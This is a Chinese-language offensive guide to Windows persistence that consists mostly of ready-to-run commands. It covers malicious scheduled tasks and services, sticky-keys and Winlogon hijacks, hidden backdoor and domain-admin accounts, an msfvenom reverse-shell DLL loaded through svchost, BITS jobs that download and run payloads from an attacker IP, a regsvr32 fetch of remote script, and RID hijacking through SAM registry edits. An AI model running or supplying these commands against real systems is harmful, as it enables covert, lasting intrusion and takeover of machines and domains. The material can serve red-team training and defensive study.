### Windows持久化

1. DLL劫持

参考[DLL劫持](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Readme.md#dll%E5%8A%AB%E6%8C%81)

2. 计划任务

```bash
schtasks /create /tn "MaliciousTask" /tr "C:\Users\Administrator\Desktop\test\payload\file\hi.exe" /sc ONSTART /ru SYSTEM
schtasks /query /TN MaliciousTask /XML
schtasks /create /tn "MaliciousTaskDaily" /tr "C:\Users\Administrator\Desktop\test\payload\file\hi.exe" /sc DAILY /st 09:00 /ru SYSTEM
```

PowerShell:

```bash
$Action = New-ScheduledTaskAction -Execute "C:\malicious.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Settings = New-ScheduledTaskSettingsSet
$Settings.ExecutionTimeLimit = "PT0S"
Register-ScheduledTask -TaskName "MaliciousTaskLogon" -Action $Action -Trigger $Trigger -User "SYSTEM" -Settings $Settings
```

```bash
schtasks /delete /TN "MaliciousTask" /F
Unregister-ScheduledTask -TaskName "MaliciousTask" -Confirm:$false
```

```bash
SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\Users\Administrator\Desktop\test\payload\file\hi.exe" /RL HIGHEST /RU SYSTEM /ENABLE
```

3. 创建服务

```bash
sc create MaliciousService binPath= "C:\hi.exe" start= auto obj= LocalSystem DisplayName= "Windows Update Service"
or
New-Service -Name "MaliciousServicePS" -BinaryPathName "C:\malicious.exe" -Description "Windows Update Service" -StartupType Automatic
```

```bash
sc start MaliciousService
sc delete MaliciousService
```

4. 辅助功能

辅助功能的可执行文件位于C:\Windows\System32目录下，辅助功能的可执行文件如下所示:
+	屏幕键盘：osk.exe。用于在屏幕上显示虚拟键盘。在运行中的Windows系统中，可以通过在“运行”对话框中输入osk并按回车键来启动。
+	放大镜：Magnify.exe。用于放大屏幕内容，键入WIN+=可快速启动。
+	轻松访问：Utilman.exe。用于管理各种辅助功能，键入WIN+U可快速启动。
+	讲述人：Narrator.exe。一种屏幕阅读器，用于朗读屏幕上的文本，键入WIN+回车可快速启动。
+	屏幕切换：DisplaySwitch.exe。切换不同的显示模式，键入WIN+P可快速启动。
+	粘滞键：sethc.exe。帮助那些难以同时按下多个组合键（例如 Ctrl + Alt + Delete）的用户。开启粘滞键后，用户可以依次按下每个键，而不是同时按下，键入五次SHIFT可快速启动。

(1)替换可执行文件

```bash
takeown /F C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrators:F
cmd.exe > sethc.exe
```

(2)修改注册表启动项

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\hi.exe" /f
```

(3)Metasploit框架

```bash
run post/windows/manage/enable_rdp
use post/windows/manage/sticky_keys
```

5. 创建账户

```bash
net user backdoor Password123! /add /comment:"Hidden Account" /fullname:"System Administrator"
net localgroup Administrators backdoor /add
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0 /f
```

```bash
New-LocalUser -Name "用户名" -NoPassword和Add-LocalGroupMember -Group "Administrators" -Member "用户名"
```

```bash
net user "hacker" "Password123!" /add /domain
net group "Domain Admins" "hacker" /add /domain
Get-ADUser -identity "hacker" -Properties memberof
```

```bash
$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
$PasswordProfile.Password = "Password123!"

New-AzureADUser `
    -DisplayName "Snowwolf" `
    -PasswordProfile $PasswordProfile `
    -UserPrincipalName "Snowwolf@contoso.com" `
    -AccountEnabled $true `
    -MailNickName "Snowwolf"

Add-AzureADGroupMember -ObjectId "<ObjectID" -RefObjectId "<RefObject>"
```

6. NetShell Helper DLLs

参考[netsh-helper-dll](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Readme.md#netsh-helper-dll)

7. Winlogon

(1)修改Userinit注册表项

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\hi.exe, C:\Windows\system32\userinit.exe" /f
```

(2)修改Shell注册表项

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\hi.exe, explorer.exe" /f
```

(3)PowerShell

```bash
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, C:\hi.exe" -Force
or
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\hi.exe" -Force
```

8. 利用Service DLL在svchost.exe中实现持久化

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f dll > msf.dll
```

```bash
sc create MaliciousService binPath= "C:\Windows\system32\svchost.exe -k netsvcs" start= auto obj= LocalSystem DisplayName= "Malicious Service" depend= RPCSS
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MaliciousService\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\Users\snowwolf\msf.dll" /f
sc start MaliciousService
```

9. 屏幕保护程序劫持

C:\Windows\System32:

msf.exe > scrnsave.scr

```bash
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Windows\System32\scrnsave.scr" /f
```

10. BITS Jobs

(1)手动创建持久化

```bash
bitsadmin /create MaliciousBITSJob
bitsadmin /addfile MaliciousBITSJob http://IP地址/payload/msf.exe C:\msf.exe
bitsadmin /SetNotifyCmdLine MaliciousBITSJob C:\msf.exe
bitsadmin /SetMinRetryDelay "MaliciousBITSJob" 30
bitsadmin /Resume MaliciousBITSJob
```

```bash
schtasks /create /tn "BitsJob" /sc minute /mo 1 /ru SYSTEM /tr "C:\Windows\System32\bitsadmin.exe /resume "\MaliciousBITSJob\""
```

(2)无文件持久性

```bash
exploit/multi/script/web_delivery
bitsadmin /create nullfile
bitsadmin /addfile nullfile http://IP地址/payload/msf.exe C:\msf.exe
bitsadmin /SetNotifyCmdLine nullfile regsvr32.exe "/s /n /u /i:http://192.168.0.189:8080/aprYTTt53.sct scrobj.dll"
bitsadmin /SetMinRetryDelay "nullfile" 30
bitsadmin /Resume nullfile
```

```bash
Get-BitsTransfer -AllUsers | Remove-BitsTransfer
```

11. RID劫持

[psexec](https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec)

```bash
wmic useraccount where name='administrator' get sid
wmic useraccount where name='snowwolf' get sid
reg query "HKLM\SAM\SAM\Domains\Account\Users\000001F4" /s
reg add "HKLM\SAM\SAM\Domains\Account\Users\000003E8" /v "F" /t REG_BINARY /d "310032003300710077006500" /f
reg query "HKLM\SAM\SAM\Domains\Account\Users\000003E8" /s
```

```bash
impacket-psexec snowwolf:密码@IP地址
```

```bash
post/windows/manage/rid_hijack
GETSYSTEM = true
GUEST_ACCOUNT = true
会话ID
Guest账户的密码
```

```bash
impacket-psexec Guest:密码@IP地址
```

12. WMI

[wmi.ps1](权限维持\wmi.ps1)
